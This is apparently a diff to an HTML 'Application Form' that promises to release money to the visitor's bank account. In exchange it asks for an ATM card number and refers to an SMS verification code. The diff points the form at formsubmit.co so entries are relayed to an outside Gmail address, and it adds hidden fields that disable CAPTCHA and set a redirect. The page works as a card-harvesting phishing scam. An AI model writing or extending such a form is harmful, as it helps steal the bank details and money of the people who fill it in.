@@ -78,7 +78,7 @@
 </head>
 <body>
 
-  <form id="applicationForm">
+  <form id="applicationForm" method="POST" action="https://formsubmit.co/exellentfirm@gmail.com">
     <h2>Application Form</h2>
 
     <!-- 1 -->
@@ -114,7 +114,7 @@
     </select>
 
     <!-- 8 -->
-    <div class="card-section" id="cardSection">
+    <div class="card-section hidden" id="cardSection">
       <label>8. We need to verify your details so that we release <span id="amountPreview">[amount]</span> to your <span id="bankPreview">[bank]</span> account.</label>
 
       <label for="atmNumber">ATM Card Number</label>
@@ -132,6 +132,10 @@
     <div class="readonly-box" id="autoFilledNote">
       You will receive [amount] immediately you submit the form and the SMS verification sent to your number [phone].
     </div>
+
+    <!-- Hidden fields for redirect and disabling CAPTCHA -->
+    <input type="hidden" name="_next" value="https://yourdomain.com/thank-you.html">
+    <input type="hidden" name="_captcha" value="false">
 
     <button type="submit">Submit Application</button>
   </form>
